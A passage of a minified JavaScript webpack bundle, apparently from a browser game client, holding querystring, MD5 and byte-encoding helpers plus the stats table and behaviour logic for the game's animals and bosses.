        });
      }, toUnicode: function (B) {
        return M(B, function (j) {
          return H.test(j) ? D(j.slice(4).toLowerCase()) : j;
        });
      }}, void 0 === (c = function () {
        return G;
      }.call(V, d, V, J)) || (J.exports = c);
    }();
  }.call(this, d(62)(y), d(12)));
}, function (y, V) {
  y.exports = function (d) {
    return d.webpackPolyfill || (d.deprecate = function () {}, d.paths = [], d.children || (d.children = []), Object.defineProperty(d, "loaded", {enumerable: !0, get: function () {
      return d.l;
    }}), Object.defineProperty(d, "id", {enumerable: !0, get: function () {
      return d.i;
    }}), d.webpackPolyfill = 1), d;
  };
}, function (y, V, d) {
  "use strict";
  y.exports = {isString: function (J) {
    return "string" == typeof J;
  }, isObject: function (J) {
    return "object" == typeof J && null !== J;
  }, isNull: function (J) {
    return null === J;
  }, isNullOrUndefined: function (J) {
    return null == J;
  }};
}, function (y, V, d) {
  "use strict";
  V.decode = V.parse = d(65), V.encode = V.stringify = d(66);
}, function (y, V, d) {
  "use strict";
  function J(c, L) {
    return Object.prototype.hasOwnProperty.call(c, L);
  }
  y.exports = function (L, U, G, q) {
    U = U || "&", G = G || "=";
    var P = {};
    if ("string" != typeof L || 0 === L.length) return P;
    var H = /\+/g;
    L = L.split(U);
    var N = 1e3;
    q && "number" == typeof q.maxKeys && (N = q.maxKeys);
    var X = L.length;
    N > 0 && X > N && (X = N);
    for (var F = 0; F < X; ++F) {
      var Z, z, O, E, I = L[F].replace(H, "%20"), M = I.indexOf(G);
      M >= 0 ? (Z = I.substr(0, M), z = I.substr(M + 1)) : (Z = I, z = ""), O = decodeURIComponent(Z), E = decodeURIComponent(z), J(P, O) ? T(P[O]) ? P[O].push(E) : P[O] = [P[O], E] : P[O] = E;
    }
    return P;
  };
  var T = Array.isArray || function (c) {
    return "[object Array]" === Object.prototype.toString.call(c);
  };
}, function (y, V, d) {
  "use strict";
  var J = function (p) {
    switch (typeof p) {
      case "string":
        return p;
      case "boolean":
        return p ? "true" : "false";
      case "number":
        return isFinite(p) ? p : "";
      default:
        return "";
    }
  };
  y.exports = function (p, U, G, q) {
    return U = U || "&", G = G || "=", null === p && (p = void 0), "object" == typeof p ? c(L(p), function (P) {
      var g = encodeURIComponent(J(P)) + G;
      return T(p[P]) ? c(p[P], function (H) {
        return g + encodeURIComponent(J(H));
      }).join(U) : g + encodeURIComponent(J(p[P]));
    }).join(U) : q ? encodeURIComponent(J(q)) + G + encodeURIComponent(J(p)) : "";
  };
  var T = Array.isArray || function (p) {
    return "[object Array]" === Object.prototype.toString.call(p);
  };
  function c(p, U) {
    if (p.map) return p.map(U);
    for (var G = [], q = 0; q < p.length; q++) G.push(U(p[q], q));
    return G;
  }
  var L = Object.keys || function (p) {
    var U = [];
    for (var G in p) Object.prototype.hasOwnProperty.call(p, G) && U.push(G);
    return U;
  };
}, function (y, V, d) {
  !function () {
    var J = d(68), T = d(20).utf8, c = d(69), L = d(20).bin, p = function (U, G) {
      U.constructor == String ? U = G && "binary" === G.encoding ? L.stringToBytes(U) : T.stringToBytes(U) : c(U) ? U = Array.prototype.slice.call(U, 0) : Array.isArray(U) || (U = U.toString());
      for (var q = J.bytesToWords(U), P = 8 * U.length, H = 1732584193, N = -271733879, X = -1732584194, F = 271733878, Z = 0; Z < q.length; Z++) q[Z] = 16711935 & (q[Z] << 8 | q[Z] >>> 24) | 4278255360 & (q[Z] << 24 | q[Z] >>> 8);
      q[P >>> 5] |= 128 << P % 32, q[14 + (P + 64 >>> 9 << 4)] = P;
      var z = p._ff, O = p._gg, E = p._hh, I = p._ii;
      for (Z = 0; Z < q.length; Z += 16) {
        var M = H, K = N, R = X, S = F;
        N = I(N = I(N = I(N = I(N = E(N = E(N = E(N = E(N = O(N = O(N = O(N = O(N = z(N = z(N = z(N = z(N, X = z(X, F = z(F, H = z(H, N, X, F, q[Z + 0], 7, -680876936), N, X, q[Z + 1], 12, -389564586), H, N, q[Z + 2], 17, 606105819), F, H, q[Z + 3], 22, -1044525330), X = z(X, F = z(F, H = z(H, N, X, F, q[Z + 4], 7, -176418897), N, X, q[Z + 5], 12, 1200080426), H, N, q[Z + 6], 17, -1473231341), F, H, q[Z + 7], 22, -45705983), X = z(X, F = z(F, H = z(H, N, X, F, q[Z + 8], 7, 1770035416), N, X, q[Z + 9], 12, -1958414417), H, N, q[Z + 10], 17, -42063), F, H, q[Z + 11], 22, -1990404162), X = z(X, F = z(F, H = z(H, N, X, F, q[Z + 12], 7, 1804603682), N, X, q[Z + 13], 12, -40341101), H, N, q[Z + 14], 17, -1502002290), F, H, q[Z + 15], 22, 1236535329), X = O(X, F = O(F, H = O(H, N, X, F, q[Z + 1], 5, -165796510), N, X, q[Z + 6], 9, -1069501632), H, N, q[Z + 11], 14, 643717713), F, H, q[Z + 0], 20, -373897302), X = O(X, F = O(F, H = O(H, N, X, F, q[Z + 5], 5, -701558691), N, X, q[Z + 10], 9, 38016083), H, N, q[Z + 15], 14, -660478335), F, H, q[Z + 4], 20, -405537848), X = O(X, F = O(F, H = O(H, N, X, F, q[Z + 9], 5, 568446438), N, X, q[Z + 14], 9, -1019803690), H, N, q[Z + 3], 14, -187363961), F, H, q[Z + 8], 20, 1163531501), X = O(X, F = O(F, H = O(H, N, X, F, q[Z + 13], 5, -1444681467), N, X, q[Z + 2], 9, -51403784), H, N, q[Z + 7], 14, 1735328473), F, H, q[Z + 12], 20, -1926607734), X = E(X, F = E(F, H = E(H, N, X, F, q[Z + 5], 4, -378558), N, X, q[Z + 8], 11, -2022574463), H, N, q[Z + 11], 16, 1839030562), F, H, q[Z + 14], 23, -35309556), X = E(X, F = E(F, H = E(H, N, X, F, q[Z + 1], 4, -1530992060), N, X, q[Z + 4], 11, 1272893353), H, N, q[Z + 7], 16, -155497632), F, H, q[Z + 10], 23, -1094730640), X = E(X, F = E(F, H = E(H, N, X, F, q[Z + 13], 4, 681279174), N, X, q[Z + 0], 11, -358537222), H, N, q[Z + 3], 16, -722521979), F, H, q[Z + 6], 23, 76029189), X = E(X, F = E(F, H = E(H, N, X, F, q[Z + 9], 4, -640364487), N, X, q[Z + 12], 11, -421815835), H, N, q[Z + 15], 16, 530742520), F, H, q[Z + 2], 23, -995338651), X = I(X, F = I(F, H = I(H, N, X, F, q[Z + 0], 6, -198630844), N, X, q[Z + 7], 10, 1126891415), H, N, q[Z + 14], 15, -1416354905), F, H, q[Z + 5], 21, -57434055), X = I(X, F = I(F, H = I(H, N, X, F, q[Z + 12], 6, 1700485571), N, X, q[Z + 3], 10, -1894986606), H, N, q[Z + 10], 15, -1051523), F, H, q[Z + 1], 21, -2054922799), X = I(X, F = I(F, H = I(H, N, X, F, q[Z + 8], 6, 1873313359), N, X, q[Z + 15], 10, -30611744), H, N, q[Z + 6], 15, -1560198380), F, H, q[Z + 13], 21, 1309151649), X = I(X, F = I(F, H = I(H, N, X, F, q[Z + 4], 6, -145523070), N, X, q[Z + 11], 10, -1120210379), H, N, q[Z + 2], 15, 718787259), F, H, q[Z + 9], 21, -343485551), H = H + M >>> 0, N = N + K >>> 0, X = X + R >>> 0, F = F + S >>> 0;
      }
      return J.endian([H, N, X, F]);
    };
    p._ff = function (U, G, q, P, g, H, N) {
      var h = U + (G & q | ~G & P) + (g >>> 0) + N;
      return (h << H | h >>> 32 - H) + G;
    }, p._gg = function (U, G, q, P, g, H, N) {
      var h = U + (G & P | q & ~P) + (g >>> 0) + N;
      return (h << H | h >>> 32 - H) + G;
    }, p._hh = function (U, G, q, P, g, H, N) {
      var h = U + (G ^ q ^ P) + (g >>> 0) + N;
      return (h << H | h >>> 32 - H) + G;
    }, p._ii = function (U, G, q, P, g, H, N) {
      var h = U + (q ^ (G | ~P)) + (g >>> 0) + N;
      return (h << H | h >>> 32 - H) + G;
    }, p._blocksize = 16, p._digestsize = 16, y.exports = function (U, G) {
      if (null == U) throw new Error("Illegal argument " + U);
      var q = J.wordsToBytes(p(U, G));
      return G && G.asBytes ? q : G && G.asString ? L.bytesToString(q) : J.bytesToHex(q);
    };
  }();
}, function (y, V) {
  !function () {
    var d = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/", J = {rotl: function (T, c) {
      return T << c | T >>> 32 - c;
    }, rotr: function (T, c) {
      return T << 32 - c | T >>> c;
    }, endian: function (T) {
      if (T.constructor == Number) return 16711935 & J.rotl(T, 8) | 4278255360 & J.rotl(T, 24);
      for (var c = 0; c < T.length; c++) T[c] = J.endian(T[c]);
      return T;
    }, randomBytes: function (T) {
      for (var c = []; T > 0; T--) c.push(Math.floor(256 * Math.random()));
      return c;
    }, bytesToWords: function (T) {
      for (var c = [], L = 0, s = 0; L < T.length; L++, s += 8) c[s >>> 5] |= T[L] << 24 - s % 32;
      return c;
    }, wordsToBytes: function (T) {
      for (var c = [], L = 0; L < 32 * T.length; L += 8) c.push(T[L >>> 5] >>> 24 - L % 32 & 255);
      return c;
    }, bytesToHex: function (T) {
      for (var c = [], L = 0; L < T.length; L++) c.push((T[L] >>> 4).toString(16)), c.push((15 & T[L]).toString(16));
      return c.join("");
    }, hexToBytes: function (T) {
      for (var c = [], L = 0; L < T.length; L += 2) c.push(parseInt(T.substr(L, 2), 16));
      return c;
    }, bytesToBase64: function (T) {
      for (var c = [], L = 0; L < T.length; L += 3) for (var p = T[L] << 16 | T[L + 1] << 8 | T[L + 2], U = 0; U < 4; U++) 8 * L + 6 * U <= 8 * T.length ? c.push(d.charAt(p >>> 6 * (3 - U) & 63)) : c.push("=");
      return c.join("");
    }, base64ToBytes: function (T) {
      T = T.replace(/[^A-Z0-9+\/]/gi, "");
      for (var c = [], L = 0, s = 0; L < T.length; s = ++L % 4) 0 != s && c.push((d.indexOf(T.charAt(L - 1)) & Math.pow(2, -2 * s + 8) - 1) << 2 * s | d.indexOf(T.charAt(L)) >>> 6 - 2 * s);
      return c;
    }};
    y.exports = J;
  }();
}, function (y, V) {
  function d(J) {
    return !!J.constructor && "function" == typeof J.constructor.isBuffer && J.constructor.isBuffer(J);
  }
  y.exports = function (J) {
    return null != J && (d(J) || function (T) {
      return "function" == typeof T.readFloatLE && "function" == typeof T.slice && d(T.slice(0, 0));
    }(J) || !!J._isBuffer);
  };
}, function (y, V) {
  y.exports = function (d, J, T, L, p, U, G, q, P) {
    this.aiTypes = [{id: 0, src: "cow_1", killScore: 150, health: 500, weightM: 0.8, speed: 0.00095, turnSpeed: 0.001, scale: 72, drop: ["food", 50]}, {id: 1, src: "pig_1", killScore: 200, health: 800, weightM: 0.6, speed: 0.00085, turnSpeed: 0.001, scale: 72, drop: ["food", 80]}, {id: 2, name: "Bull", src: "bull_2", hostile: !0, dmg: 20, killScore: 1e3, health: 1800, weightM: 0.5, speed: 0.00094, turnSpeed: 0.00074, scale: 78, viewRange: 800, chargePlayer: !0, drop: ["food", 100]}, {id: 3, name: "Bully", src: "bull_1", hostile: !0, dmg: 20, killScore: 2e3, health: 2800, weightM: 0.45, speed: 0.001, turnSpeed: 0.0008, scale: 90, viewRange: 900, chargePlayer: !0, drop: ["food", 400]}, {id: 4, name: "Wolf", src: "wolf_1", hostile: !0, dmg: 8, killScore: 500, health: 300, weightM: 0.45, speed: 0.001, turnSpeed: 0.002, scale: 84, viewRange: 800, chargePlayer: !0, drop: ["food", 200]}, {id: 5, name: "duck", src: "chicken_1", dmg: 8, killScore: 2e3, noTrap: !0, health: 300, weightM: 0.2, speed: 0.0018, turnSpeed: 0.006, scale: 70, drop: ["food", 100]}, {id: 6, name: "MOOSTAFA", nameScale: 50, src: "enemy", hostile: !0, dontRun: !0, fixedSpawn: !0, spawnDelay: 6e4, noTrap: !0, colDmg: 100, dmg: 40, killScore: 8e3, health: 18e3, weightM: 0.4, speed: 0.0007, turnSpeed: 0.01, scale: 80, spriteMlt: 1.8, leapForce: 0.9, viewRange: 1e3, hitRange: 210, hitDelay: 1e3, chargePlayer: !0, drop: ["food", 100]}, {id: 7, name: "Treasure", hostile: !0, nameScale: 35, src: "crate_1", fixedSpawn: !0, spawnDelay: 12e4, colDmg: 200, killScore: 5e3, health: 2e4, weightM: 0.1, speed: 0, turnSpeed: 0, scale: 70, spriteMlt: 1}, {id: 8, name: "MOOFIE", src: "wolf_2", hostile: !0, fixedSpawn: !0, dontRun: !0, hitScare: 4, spawnDelay: 3e4, noTrap: !0, nameScale: 35, dmg: 10, colDmg: 100, killScore: 3e3, health: 7e3, weightM: 0.45, speed: 0.0015, turnSpeed: 0.002, scale: 90, viewRange: 800, chargePlayer: !0, drop: ["food", 1e3]}], this.spawn = function (g, H, N, X) {
      for (var F, Z = 0; Z < d.length; ++Z) if (!d[Z].active) {
        F = d[Z];
        break;
      }
      return F || (F = new J(d.length, p, T, L, G, U, q, P), d.push(F)), F.init(g, H, N, X, this.aiTypes[X]), F;
    };
  };
}, function (y, V) {
  var d = 2 * Math.PI;
  y.exports = function (J, T, L, p, U, G, q, P) {
    this.sid = J, this.isAI = !0, this.nameIndex = U.randInt(0, G.cowNames.length - 1), this.init = function (X, F, Z, z, O) {
      this.x = X, this.y = F, this.startX = O.fixedSpawn ? X : null, this.startY = O.fixedSpawn ? F : null, this.xVel = 0, this.yVel = 0, this.zIndex = 0, this.dir = Z, this.dirPlus = 0, this.index = z, this.src = O.src, O.name && (this.name = O.name), this.weightM = O.weightM, this.speed = O.speed, this.killScore = O.killScore, this.turnSpeed = O.turnSpeed, this.scale = O.scale, this.maxHealth = O.health, this.leapForce = O.leapForce, this.health = this.maxHealth, this.chargePlayer = O.chargePlayer, this.viewRange = O.viewRange, this.drop = O.drop, this.dmg = O.dmg, this.hostile = O.hostile, this.dontRun = O.dontRun, this.hitRange = O.hitRange, this.hitDelay = O.hitDelay, this.hitScare = O.hitScare, this.spriteMlt = O.spriteMlt, this.nameScale = O.nameScale, this.colDmg = O.colDmg, this.noTrap = O.noTrap, this.spawnDelay = O.spawnDelay, this.hitWait = 0, this.waitCount = 1e3, this.moveCount = 0, this.targetDir = 0, this.active = !0, this.alive = !0, this.runFrom = null, this.chargeTarget = null, this.dmgOverTime = {};
    };
    var g = 0;
    this.update = function (X) {
      if (this.active) {
        if (this.spawnCounter) return this.spawnCounter -= X, void (this.spawnCounter <= 0 && (this.spawnCounter = 0, this.x = this.startX || U.randInt(0, G.mapScale), this.y = this.startY || U.randInt(0, G.mapScale)));
        (g -= X) <= 0 && (this.dmgOverTime.dmg && (this.changeHealth(-this.dmgOverTime.dmg, this.dmgOverTime.doer), this.dmgOverTime.time -= 1, this.dmgOverTime.time <= 0 && (this.dmgOverTime.dmg = 0)), g = 1e3);
        var F = !1, Z = 1;
        if (!this.zIndex && !this.lockMove && this.y >= G.mapScale / 2 - G.riverWidth / 2 && this.y <= G.mapScale / 2 + G.riverWidth / 2 && (Z = 0.33, this.xVel += G.waterCurrent * X), this.lockMove) this.xVel = 0, this.yVel = 0; else if (this.waitCount > 0) {
          if (this.waitCount -= X, this.waitCount <= 0) if (this.chargePlayer) {
            for (var z, O, K, R = 0; R < L.length; ++R) !L[R].alive || L[R].skin && L[R].skin.bullRepel || (K = U.getDistance(this.x, this.y, L[R].x, L[R].y)) <= this.viewRange && (!z || K < O) && (O = K, z = L[R]);
            z ? (this.chargeTarget = z, this.moveCount = U.randInt(8e3, 12e3)) : (this.moveCount = U.randInt(1e3, 2e3), this.targetDir = U.randFloat(-Math.PI, Math.PI));
          } else this.moveCount = U.randInt(4e3, 1e4), this.targetDir = U.randFloat(-Math.PI, Math.PI);
        } else if (this.moveCount > 0) {
          var Y = this.speed * Z;
          if (this.runFrom && this.runFrom.active && (!this.runFrom.isPlayer || this.runFrom.alive) ? (this.targetDir = U.getDirection(this.x, this.y, this.runFrom.x, this.runFrom.y), Y *= 1.42) : this.chargeTarget && this.chargeTarget.alive && (this.targetDir = U.getDirection(this.chargeTarget.x, this.chargeTarget.y, this.x, this.y), Y *= 1.75, F = !0), this.hitWait && (Y *= 0.3), this.dir != this.targetDir) {
            this.dir %= d;
            var Q = (this.dir - this.targetDir + d) % d, D = Math.min(Math.abs(Q - d), Q, this.turnSpeed * X), W = Q - Math.PI >= 0 ? 1 : -1;
            this.dir += W * D + d;
          }
          this.dir %= d, this.xVel += Y * X * Math.cos(this.dir), this.yVel += Y * X * Math.sin(this.dir), this.moveCount -= X, this.moveCount <= 0 && (this.runFrom = null, this.chargeTarget = null, this.waitCount = this.hostile ? 1500 : U.randInt(1500, 6e3));
        }
        this.zIndex = 0, this.lockMove = !1;
        var B = U.getDistance(0, 0, this.xVel * X, this.yVel * X), j = Math.min(4, Math.max(1, Math.round(B / 40))), C = 1 / j;
        for (R = 0; R < j; ++R) {
          this.xVel && (this.x += this.xVel * X * C), this.yVel && (this.y += this.yVel * X * C), y6 = T.getGridArrays(this.x, this.y, this.scale);
          for (var y0 = 0; y0 < y6.length; ++y0) for (var y1 = 0; y1 < y6[y0].length; ++y1) y6[y0][y1].active && T.checkCollision(this, y6[y0][y1], C);
        }
        var y2, y3, y4, y5 = !1;
        if (this.hitWait > 0 && (this.hitWait -= X, this.hitWait <= 0)) {
          y5 = !0, this.hitWait = 0, this.leapForce && !U.randInt(0, 2) && (this.xVel += this.leapForce * Math.cos(this.dir), this.yVel += this.leapForce * Math.sin(this.dir));
          for (var y6 = T.getGridArrays(this.x, this.y, this.hitRange), y7 = 0; y7 < y6.length; ++y7) for (y0 = 0; y0 < y6[y7].length; ++y0) (y2 = y6[y7][y0]).health && (y3 = U.getDistance(this.x, this.y, y2.x, y2.y)) < y2.scale + this.hitRange && (y2.changeHealth(5 * -this.dmg) && T.disableObj(y2), T.hitObj(y2, U.getDirection(this.x, this.y, y2.x, y2.y)));
          for (y0 = 0; y0 < L.length; ++y0) L[y0].canSee(this) && P.send(L[y0].id, "aa", this.sid);
        }
        if (F || y5) for (R = 0; R < L.length; ++R) (y2 = L[R]) && y2.alive && (y3 = U.getDistance(this.x, this.y, y2.x, y2.y), this.hitRange ? !this.hitWait && y3 <= this.hitRange + y2.scale && (y5 ? (y4 = U.getDirection(y2.x, y2.y, this.x, this.y), y2.changeHealth(-this.dmg), y2.xVel += 0.6 * Math.cos(y4), y2.yVel += 0.6 * Math.sin(y4), this.runFrom = null, this.chargeTarget = null, this.waitCount = 3e3, this.hitWait = U.randInt(0, 2) ? 0 : 600) : this.hitWait = this.hitDelay) : y3 <= this.scale + y2.scale && (y4 = U.getDirection(y2.x, y2.y, this.x, this.y), y2.changeHealth(-this.dmg), y2.xVel += 0.55 * Math.cos(y4), y2.yVel += 0.55 * Math.sin(y4)));
        this.xVel && (this.xVel *= Math.pow(G.playerDecel, X)), this.yVel && (this.yVel *= Math.pow(G.playerDecel, X));
        var y8 = this.scale;
        this.x - y8 < 0 ? (this.x = y8, this.xVel = 0) : this.x + y8 > G.mapScale && (this.x = G.mapScale - y8, this.xVel = 0), this.y - y8 < 0 ? (this.y = y8, this.yVel = 0) : this.y + y8 > G.mapScale && (this.y = G.mapScale - y8, this.yVel = 0);
      }
    }, this.canSee = function (X) {
      if (!X) return !1;
      if (X.skin && X.skin.invisTimer && X.noMovTimer >= X.skin.invisTimer) return !1;
      var F = Math.abs(X.x - this.x) - X.scale, Z = Math.abs(X.y - this.y) - X.scale;
      return F <= G.maxScreenWidth / 2 * 1.3 && Z <= G.maxScreenHeight / 2 * 1.3;
    };
    var H = 0, N = 0;
    this.animate = function (X) {
      this.animTime > 0 && (this.animTime -= X, this.animTime <= 0 ? (this.animTime = 0, this.dirPlus = 0, H = 0, N = 0) : 0 == N ? (H += X / (this.animSpeed * G.hitReturnRatio), this.dirPlus = U.lerp(0, this.targetAngle, Math.min(1, H)), H >= 1 && (H = 1, N = 1)) : (H -= X / (this.animSpeed * (1 - G.hitReturnRatio)), this.dirPlus = U.lerp(0, this.targetAngle, Math.max(0, H))));
    }, this.startAnim = function () {
      this.animTime = this.animSpeed = 600, this.targetAngle = 0.8 * Math.PI, H = 0, N = 0;
    }, this.changeHealth = function (X, F, Z) {
      if (this.active && (this.health += X, Z && (this.hitScare && !U.randInt(0, this.hitScare) ? (this.runFrom = Z, this.waitCount = 0, this.moveCount = 2e3) : this.hostile && this.chargePlayer && Z.isPlayer ? (this.chargeTarget = Z, this.waitCount = 0, this.moveCount = 8e3) : this.dontRun || (this.runFrom = Z, this.waitCount = 0, this.moveCount = 2e3)), X < 0 && this.hitRange && U.randInt(0, 1) && (this.hitWait = 500), F && F.canSee(this) && X < 0 && P.send(F.id, "t", Math.round(this.x), Math.round(this.y), Math.round(-X), 1), this.health <= 0 && (this.spawnDelay ? (this.spawnCounter = this.spawnDelay, this.x = -1e6, this.y = -1e6) : (this.x = this.startX || U.randInt(0, G.mapScale), this.y = this.startY || U.randInt(0, G.mapScale)), this.health = this.maxHealth, this.runFrom = null, F && (q(F, this.killScore), this.drop)))) for (var z = 0; z < this.drop.length;) F.addResource(G.resourceTypes.indexOf(this.drop[z]), this.drop[z + 1]), z += 2;
    };
  };
}]);